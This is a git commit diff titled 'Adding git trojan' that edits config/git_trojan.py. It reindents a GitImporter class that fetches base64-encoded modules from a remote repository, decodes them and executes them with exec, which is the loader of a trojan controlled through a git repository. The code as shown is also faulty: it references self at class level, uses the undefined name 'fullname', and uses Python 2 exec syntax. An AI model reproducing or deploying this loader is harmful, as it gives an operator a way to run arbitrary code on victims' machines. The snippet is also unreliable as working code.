4f3d0e96ac713f5a4e30350f9d4e6f1fa5ae4eb9
Administrator <razinext9@gmail.com>
2020-02-17 03:30:09 -0800

    Adding git trojan

--- config/git_trojan.py
+++ config/git_trojan.py
@@ -50,20 +50,20 @@ def store_module_result(data):
 
 class GitImporter(object):
     def __init__(self):
-        self.current_module_code = ""
-        def find_module(self,fullpath,path=None):
-            if configured:
-                print("[*] Attempting to retrive %s" % fullname)
-                new_library = get_file_contents("modules/%s" % fullname)
-                if new_library is not None:
-                    self.current_module_code = base64.b64decode(new_library)
-                    return self
-            return None
-        def load_module(self,name):
-            module = imp.new_module(name)
-            exec self.current_module_code in module.__dict__
-            sys.modules[name] = module
-            return module
+    self.current_module_code = ""
+    def find_module(self, fullpath, path=None):
+        if configured:
+            print("[*] Attempting to retrieve %s" % fullname)
+            new_library = get_file_contents("modules/%s" % fullname)
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+                return self
+        return None
+    def load_module(self,name):
+        module = imp.new_module(name)
+        exec self.current_module_code in module.__dict__
+        sys.modules[name] = module
+        return module
 
 
 def module_runner(module):
